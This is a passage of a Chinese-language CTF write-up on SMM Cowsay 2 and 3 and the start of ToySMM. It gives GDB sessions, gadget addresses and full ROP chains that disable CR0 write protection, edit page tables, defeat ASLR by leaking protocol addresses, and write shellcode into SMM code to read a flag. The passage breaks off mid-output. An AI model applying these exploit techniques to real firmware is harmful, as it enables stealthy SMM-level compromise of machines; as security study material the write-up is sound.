<p>现在我们可以使用以下脚本启动漏洞利用并附加 GDB：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> script.gdb</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line"><span class="built_in">break</span> *(SmmCowsayHandler + 0x302)</span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb -x script.gdb</span><br><span class="line">...</span><br><span class="line">Breakpoint 1, 0x0000000007ee92c5 <span class="keyword">in</span> SmmCowsayHandler (CommBufferSize=&lt;optimized out&gt;, CommBuffer=0x69bb030, ...</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x4141414141414141  4702111234474983745</span><br><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0x4141414141414141 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">(gdb) x/100gx <span class="variable">$rsp</span></span><br><span class="line">0x7fb6a78:  0x0000000007ee92c7  0x0000000007ffa8d8</span><br><span class="line">0x7fb6a88:  0x0000000007ff0bc5  0x00000000069bb030</span><br><span class="line">0x7fb6a98:  0x0000000007fb6c38  0x0000000007fb6b80</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x7fb6b48:  0x00000000069bb018  0x0000000013131300</span><br><span class="line">0x7fb6b58:  0x0000000014141414  0x0000000015151515</span><br></pre></td></tr></table></figure>
<p>看起来 R13（除了 LSB）、R14 和 R15 不知何故在 <code>rsp + 0xe0</code> 处溢出到堆栈上。从 <code>call rax</code> 返回后， <code>SmmCowsayHandler</code> 中的代码执行以下操作</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30i SmmCowsayHandler + 0x302</span><br><span class="line">   0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   ... a bunch of useless stuff ...</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure>
<p>因此，在最后一个 <code>ret</code> 时，我们将使寄存器溢出到堆栈上的距离更近。非常方便的是，在我们转储的小工具中，在 <code>VariableSmm.efi + 0x8a49</code> 处有一个 <code>ret 0x70</code> 。我们可以使用这个小工具将 RSP 精确地<strong>移动到溢出的 R14 之上</strong>，从而使我们能够执行另一个 <code>pop rsp; ret</code> 形式的gadget，这将从 R15 的值中获取 RSP 的新值堆栈！在此之后，我们完全控制了堆栈，我们可以编写更长的ROP链。</p>
<h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>迁移堆栈并启动真正的 ROP 链后，我们需要以下gadget</p>
<ul>
<li>设置 CR0 以便能够禁用 <code>CR0.WP</code> 编辑页表。</li>
<li>写入任意地址的内存以覆盖标志地址的页表条目。</li>
<li>从内存读入寄存器以获得标志。</li>
</ul>
<p>只要有一点耐心，所有这些都可以轻松找到，因为我们手上有很多gadget</p>
<p>由于地址不会改变，所以我们实际上不需要担心遍历页表：我们只需使用 GDB 找到 <code>0x44440000</code> 的页表条目的地址，然后将其硬编码到漏洞利用中:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl2_idx</span> = (0x44440000 &gt;&gt; 12 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl1_idx</span> = (0x44440000 &gt;&gt; 12) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_entry</span> = *(unsigned long *)(<span class="variable">$cr3</span> + 8 * <span class="variable">$lvl4_idx</span>)</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_entry</span> = *(unsigned long *)((<span class="variable">$lvl4_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl3_idx</span>)</span><br><span class="line">(gdb) set <span class="variable">$lvl2_entry</span> = *(unsigned long *)((<span class="variable">$lvl3_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl2_idx</span>)</span><br><span class="line"></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry_addr</span> = (<span class="variable">$lvl2_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl1_idx</span></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry</span>      = *(unsigned long *)<span class="variable">$lvl1_entry_addr</span></span><br><span class="line"></span><br><span class="line">(gdb) printf &quot;PTE at <span class="number">0</span>x%lx, value = <span class="number">0</span>x%<span class="number">016</span>lx\n&quot;, <span class="variable">$lvl1_entry_addr</span>, <span class="variable">$lvl1_entry</span></span><br><span class="line"></span><br><span class="line">PTE at <span class="number">0</span>x7ed0200, value = <span class="number">0</span>x8000000044440066</span><br></pre></td></tr></table></figure>
<p>请注意 <code>0x8000000044440066</code> 设置位 63 (NX)与位 0 , 1 未设置（不存在，不可读写）。我们需要设置位 0 以便将页面标记为存在，因此我们想要的值为 <code>0x8000000044440067</code> 。</p>
<p>从 GDB 检查 CR0 的值，我们得到 <code>0x80010033</code> ：关闭 WP 位会得到 <code>0x80000033</code> ，所以这就是我们在尝试编辑页表条目之前要写入 CR0 的内容在 <code>0x7ed0200</code> 。</p>
<p>找到我们需要的gadegt后，真正的 ROP 链是这样的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>将flag读到rax寄存器中</p>
<p>然后执行几次即可获得完整的flag</p>
<h2 id="uictf2022-cowsay3"><a href="#uictf2022-cowsay3" class="headerlink" title="uictf2022-cowsay3"></a>uictf2022-cowsay3</h2><p>题目描述</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We fired that engineer. Unfortunately, other engineers refused to touch this code, but instead suggested to integrate some ASLR code found online. Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now that we have the monster combination of ASLR+DEP, we should surely be secure, right?</span><br></pre></td></tr></table></figure>
<p>在之前的基础上又添加了ASLR以及DEP,但好在smmcowsay.efi的代码并没有改变</p>
<ol>
<li><p><code>SMM_CODE_CHK_EN</code> 已启用：这是 <code>MSR_SMM_FEATURE_CONTROL</code> MSR中的一个位，它控制SMM是否可以执行其他两个MSR定义的范围之外的代码： <code>IA32_SMRR_PHYSBASE</code> 和 <code>IA32_SMRR_PHYSMASK</code> （基本上在SMRAM之外）。当设置 <code>SMM_CODE_CHK_EN</code> 时， <code>MSR_SMM_FEATURE_CONTROL</code> 的“Lock”位也在 QEMU 中设置，因此无法禁用此检查。</p>
<p>这并不是真正的问题，因为我们并没有真正在 SMRAM 之外执行任何代码。假设我们找到了正确的小工具，我们已经可以通过一个简单的 ROP 链（利用 SMRAM 中已有的代码）获得我们想要的东西。</p>
</li>
<li><p>ASLR 已添加到 EDK2（<a target="_blank" rel="noopener" href="https://github.com/jyao1/SecurityEx来自">https://github.com/jyao1/SecurityEx来自</a> jyao1/SecurityEx 的原始补丁，有一些细微的更改）：现在每个驱动程序都加载到不同的地址，该地址会更改每次启动，并使用 <code>rdrand</code> 指令获取 10 位熵。不用说，这使得像我们之前的漏洞利用那样使用硬编码地址变得不可能。</p>
</li>
</ol>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>解决ASLR最常见的办法就是泄露一个基址</p>
<p>我们如何泄露一些SMM地址以击败ASLR？ EDK2 驱动程序注册了一堆协议。每个协议都有自己的 GUID，使用有效的 GUID 调用 <code>BootServices-&gt;LocateProtocol</code> 将返回指向协议结构的指针（如果存在），该结构驻留在实现协议的驱动程序中！这允许我们泄漏实现在执行代码时注册的协议的任何驱动程序的基地址（在简单的减法之后）</p>
<p>如果我们查看 EDK2 源代码中的文件<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec">MdePkg/MdePkg.dec</a>，我们会看到一堆针对不同协议的 GUID。甚至无需浪费时间检查源代码的其他部分，我们就可以将它们全部转储并尝试请求其中的每一个，直到找到一个看起来有趣的地址。</p>
<p>再次，修补 <code>run.sh</code> 脚本，让 QEMU 将 EDK2 调试输出转储到文件中，就像我们对 SMM Cowsay 2 所做的那样，我们可以找到 SMBASE，在编写漏洞利用程序时假设它是 SMRAM 的起始地址。理论上，SMRAM可以在SMBASE之前和之后扩展，根据Intel Doc，SMBASE只是标记用于查找SMI处理程序和保存状态区域的入口点的基地址。</p>
<p><code>CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400</code></p>
<p>现在，使用我们在之前的两个挑战中使用的相同代码，我们可以检查 <code>MdePkg/MdePkg.dec</code> 中列出的每个协议 GUID，并查看返回的地址是否在 SMBASE 之后:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;CPU[000]  APIC ID=0000  SMBASE=&#x27;</span>):</span><br><span class="line">            smbase = <span class="built_in">int</span>(line[<span class="number">31</span>:<span class="number">31</span> + <span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> guid <span class="keyword">in</span> guids:</span><br><span class="line">    code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* LocateProtocol(&amp;guid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">        lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">        call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        test rax, rax</span></span><br><span class="line"><span class="string">        jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fail:</span></span><br><span class="line"><span class="string">        ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    guid:</span></span><br><span class="line"><span class="string">        .octa <span class="subst">&#123;guid&#125;</span></span></span><br><span class="line"><span class="string">    protocol:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">    proto = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> proto &gt; smbase:</span><br><span class="line">        log.info(<span class="string">&#x27;Interesting protocol: GUID = 0x%x, ADDR = 0x%x&#x27;</span>, guid, proto)</span><br></pre></td></tr></table></figure>
<p>果然，通过让脚本运行足够的时间，我们发现 <code>gEfiSmmConfigurationProtocolGuid</code> 返回一个指向协议地址的指针。查看已加载驱动程序的 <code>debug.log</code> ，我们可以看到该地址位于 <code>PiSmmCpuDxeSmm.efi</code> SMM 驱动程序内部，简单的减法即可得出其基地址。</p>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>现在我们可以看一下 <code>PiSmmCpuDxeSmm.efi</code> 中的gadgets。事实证明，我们很幸运：</p>
<ul>
<li>从 GDB 来看，我们仍然有 R13、R14 和 R15 以完全相同的偏移量溢出到 SMI 堆栈上。</li>
<li>我们可以向前移动堆栈指针： <code>ret 0x6d</code></li>
<li>我们可以翻转堆栈： <code>pop rsp; ret</code></li>
<li>我们可以弹出 RAX 和其他寄存器： <code>pop rax ; pop rbx ; pop r12 ; ret</code></li>
<li>我们可以设置CR0： <code>mov cr0, rax ; wbinvd ; ret</code></li>
<li>我们有一个 write-what-where 原语： <code>mov qword ptr [rbx], rax ; pop rbx ; ret</code></li>
</ul>
<p>我们没有更多好的gadgets可以使用，所以这次在禁用 CR0.WP 后，我们不再使用 ROP 编写整个漏洞利用程序，而是使用 write-what-where gadget 来覆盖 <code>PiSmmCpuDxeSmm.efi</code> 的一段 <code>.text</code> 带有第 2 阶段 shellcode，然后简单地跳转到它。<br>唯一有点烦人的部分是 <code>ret 0x6d</code> gadget 将堆栈向前移动：这将导致堆栈未对齐，落在堆栈上溢出的 R13 值的 2 个最高有效字节中。<strong>这不是一个真正的问题，幸运的是 CPU（或者更好的是 QEMU）似乎并不关心未对齐的堆栈指针。</strong>我们只需使用 R{13,14,15} 进行一些位移即可将值很好地放入堆栈中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># SmmConfigurationProtocol leaked using <span class="title function_">LocateProtocol</span><span class="params">(gEfiSmmConfigurationProtocolGuid)</span></span><br><span class="line">PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - <span class="number">0x16210</span></span><br><span class="line">PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;SmmConfigurationProtocol    @ 0x%x&#x27;</span>, SmmConfigurationProtocol)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi       @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_base)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi .text @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_text)</span><br><span class="line"></span><br><span class="line">new_smm_stack   = buffer + <span class="number">0x800</span></span><br><span class="line">ret_0x6d        = PiSmmCpuDxeSmm_base + <span class="number">0xfc8a</span>  <span class="meta"># ret 0x6d</span></span><br><span class="line">flip_stack      = PiSmmCpuDxeSmm_base + <span class="number">0x3c1c</span>  <span class="meta"># pop rsp ; ret</span></span><br><span class="line">pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + <span class="number">0xd228</span>  <span class="meta"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">mov_cr0_rax     = PiSmmCpuDxeSmm_base + <span class="number">0x10a7d</span> <span class="meta"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">write_primitive = PiSmmCpuDxeSmm_base + <span class="number">0x3b8f</span>  <span class="meta"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x6d)</span><br></pre></td></tr></table></figure>
<p>正如我们刚才所说，我们将使用一些gadgets来创建 ROP 链，这些gadgets会将第二阶段 shellcode 写入 <code>PiSmmCpuDxeSmm.efi</code> 的 <code>.text</code> 中，然后跳转到它。该 shellcode 必须遍历页表（这次由于 ASLR，我们无法预先计算 PTE 的地址），设置 PTE 上的当前位，然后将标志读入（一个或多个）寄存器。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">stage2_shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rbx, 0xffffffff000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Walk page table */</span></span><br><span class="line"><span class="string">    mov rax, cr3</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x1]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x22]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rbx, rax</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x40]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set present bit */</span></span><br><span class="line"><span class="string">    or al, 1</span></span><br><span class="line"><span class="string">    mov qword ptr [rbx + 8 * 0x40], rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Read flag and die so regs get dumped, GG! */</span></span><br><span class="line"><span class="string">    movabs rax, 0x44440000</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    pop_rax_rbx_r12, <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>     , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    mov_cr0_rax    , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now that CR0.WP is unset, we can just patch SMM code and jump to it!</span></span><br><span class="line"><span class="comment"># Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text</span></span><br><span class="line"><span class="comment"># 8 bytes at a time, then jump into it</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(stage2_shellcode), <span class="number">8</span>):</span><br><span class="line">    chunk = stage2_shellcode[i:i + <span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">    chunk = u64(chunk)</span><br><span class="line"></span><br><span class="line">    real_chain += [</span><br><span class="line">        pop_rax_rbx_r12        , <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">        chunk                  , <span class="comment"># -&gt; RAX</span></span><br><span class="line">        PiSmmCpuDxeSmm_text + i, <span class="comment"># -&gt; RBX</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>             ,</span><br><span class="line">        write_primitive        , <span class="comment"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line">        <span class="number">0xdeadbeef</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">real_chain += [PiSmmCpuDxeSmm_text]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transform real ROP chain into .quad directives to embed in the shellcode:</span></span><br><span class="line"><span class="comment">#   .quad 0x7f8a184</span></span><br><span class="line"><span class="comment">#   .quad 0x80000033</span></span><br><span class="line"><span class="comment">#    ...</span></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br></pre></td></tr></table></figure>
<p><strong>SMM的代码段是可写的,应该不是本题专属</strong></p>
<h2 id="Doubhe2024-ToySMM"><a href="#Doubhe2024-ToySMM" class="headerlink" title="Doubhe2024-ToySMM"></a>Doubhe2024-ToySMM</h2><p><em>有了前面三题的基础,这不是乱杀</em></p>
<p>先跑一下<code>run.sh</code>,看看程序是怎样运行的</p>
<p>启动后弹出了这么一个窗口</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Mapping table</span><br><span class="line">      FS0: 